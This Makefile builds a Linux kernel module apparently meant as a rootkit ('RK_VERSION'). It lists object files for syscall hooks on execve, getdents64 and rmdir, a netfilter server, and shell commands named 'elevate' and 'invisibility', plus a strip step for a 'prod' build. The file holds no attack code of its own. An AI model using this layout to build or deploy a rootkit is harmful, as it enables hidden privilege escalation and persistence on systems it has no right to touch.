MODULE_NAME := goodboi
PROD_MODULE_NAME := prod.goodboi

####################################################
####################################################

SRC_DIR := src
BUILD_DIR := build
DIST_DIR := dist

BASE_OBJS := src/inc/hooks/utils.o src/inc/hooks/syscall/execve/execve.o src/inc/hooks/syscall/getdents64/getdents64.o src/inc/hooks/syscall/rmdir/rmdir.o src/inc/hooks/netfilter/server/server.o src/inc/shell/dispatcher.o src/inc/shell/parser/parser.o src/inc/shell/commands/sudo/sudo.o src/inc/shell/commands/version/version.o src/inc/shell/commands/elevate/elevate.o src/inc/shell/commands/invisibility/invisibility.o src/entry.o src/utils/ftrace/ftrace_helper.o src/utils/stores/stores.o src/logger/logger.o 

####################################################

obj-m := $(MODULE_NAME).o
$(MODULE_NAME)-objs := $(BASE_OBJS)

####################################################
####################################################

KBUILD_CFLAGS += -DDEBUG=1 \
    -DRK_VERSION='"1753025745:430d5c6"'

####################################################
####################################################

JOBS := $(shell nproc)
KDIR := /lib/modules/$(shell uname -r)/build

####################################################
####################################################

.PHONY: all
all: modules

####################################################

.PHONY: rebuild
rebuild: clean all

####################################################
####################################################

modules:
	$(MAKE) \
	    -j $(JOBS) \
	    -C $(KDIR) \
	    M=$(CURDIR) \
	    MO=$(CURDIR)/$(BUILD_DIR) \
	    modules

clean:
	$(MAKE) \
	    -j $(JOBS) \
	    -C $(KDIR) \
	    M=$(CURDIR) \
	    MO=$(CURDIR)/$(BUILD_DIR) \
	    clean

####################################################
####################################################

.PHONY: strip
strip:
	strip -s $(BUILD_DIR)/$(MODULE_NAME).ko -o $(BUILD_DIR)/$(PROD_MODULE_NAME).ko

####################################################
